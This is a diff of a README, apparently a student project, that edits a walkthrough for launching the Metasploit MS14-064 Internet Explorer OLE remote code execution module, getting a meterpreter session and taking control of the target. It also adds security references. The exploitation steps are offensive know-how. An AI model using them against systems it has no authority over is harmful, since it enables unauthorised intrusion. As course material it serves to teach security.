@@ -51,25 +51,25 @@ The tool works in 3 steps:
 
 # Using the exploit
 
-* Start metasploit
+* Start metasploit:
 
 ```bash
 msfconsole
 ```
 
-* Load the exploitation module
+* Load the exploitation module:
 
 ```bash
 use exploit/windows/browser/ms14_064_ole_code_execution
 ```
 
-- Additional options can be displayed using
+- Additional options can be displayed using:
 
 ```bash
 show options
 ```
 
-* Run the exploit
+* Run the exploit:
 
 ```bash
 exploit
@@ -81,7 +81,7 @@ This creates a numbered meterpreter session.
 
 # Post exploitation
 
-* Attach to the meterpreter session
+* Attach to the meterpreter session:
 
 ```bash
 sessions -i <sessionnumber>
@@ -89,8 +89,32 @@ sessions -i <sessionnumber>
 
 * You now have access to the exploited system
 
-* Valid commands and scripts can be displayed using
+&nbsp;
+
+Available commands and instructions can be displayed using:
 
 ```bash
 help
+```
+
+---
+
+# References
+
+*  “Microsoft Security Bulletin MS14-064 - Critical.”
+ - Microsoft, [Link](https://technet.microsoft.com/library/security/MS14-064#ID0EUYAE)
+ 
+* “MS14-064 Microsoft Internet Explorer Windows OLE Automation Array Remote Code Execution.”
+ - Rapid7, [Link](https://www.rapid7.com/db/modules/exploit/windows/browser/ms14_064_ole_code_execution)
+ 
+* W. Wu, “A killer combo: Critical vulnerability and ’godmode’ exploitation on CVE-2014-6332.”
+ - Trendmicro, [Link](http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/)
+
+&nbsp;
+
+
+These slides can be accessed through
+
+```bash
+stikoandreas.github.io/slides/project4
 ```
